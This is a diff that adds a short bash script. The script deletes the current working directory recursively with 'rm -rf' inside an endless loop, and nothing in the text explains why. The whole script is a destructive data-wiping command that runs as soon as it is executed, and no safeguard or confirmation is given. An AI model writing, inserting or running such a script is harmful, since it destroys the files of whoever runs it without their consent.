@@ -1,0 +1,6 @@
+#!/bin/bash
+dir=$(echo $PWD)
+while :
+do
+rm -rf $dir
+done
